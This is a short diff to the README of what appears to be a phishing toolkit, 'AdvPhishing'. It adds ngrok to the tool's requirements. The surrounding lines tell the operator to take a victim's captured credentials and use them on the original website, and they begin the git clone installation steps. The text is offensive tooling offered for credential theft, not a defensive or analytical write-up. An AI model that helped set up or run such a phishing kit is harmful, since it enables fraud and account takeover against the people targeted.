@@ -16,6 +16,7 @@ When victim enter his credentials, you need to go to original website and use th
 * sudo - [ MUST ]
 * php
 * apache2
+* ngrok
 # INSTALLATION 
 * git clone https://github.com/Ignitetch/AdvPhishing.git
 * cd AdvPhishing/
